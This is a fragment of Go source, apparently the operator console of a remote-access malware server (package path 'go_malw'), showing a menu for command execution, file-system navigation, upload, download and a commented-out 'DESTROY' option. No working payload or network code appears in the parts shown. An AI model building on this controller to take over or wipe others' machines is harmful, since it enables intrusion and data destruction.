...
import (
	...
	"go_malw/server/core/PrintAscii"
...
func options() {
	fmt.Println()
	fmt.Println(color.Yellow + "		[1] ExecuteCommands" + color.Reset)
	fmt.Println(color.Yellow + "		[2] Move in File System" + color.Reset)
	fmt.Println(color.Yellow + "		[3] Upload Files" + color.Reset)
	fmt.Println(color.Yellow + "		[4] Download Files" + color.Reset)
	//fmt.Println(color.Yellow + "		5] Download Folders" + color.Reset)
	//fmt.Println(color.Yellow + "		[5] DESTROY" + color.Reset)
	fmt.Println(color.Yellow + "		[99] Exit" + color.Reset)
	fmt.Println()
}
...
func main() {
	...
	for loopControl {
		...
		case user_input == "1":
			fmt.Println(color.Green + "[+]" + color.Reset + " Command Execution Program")
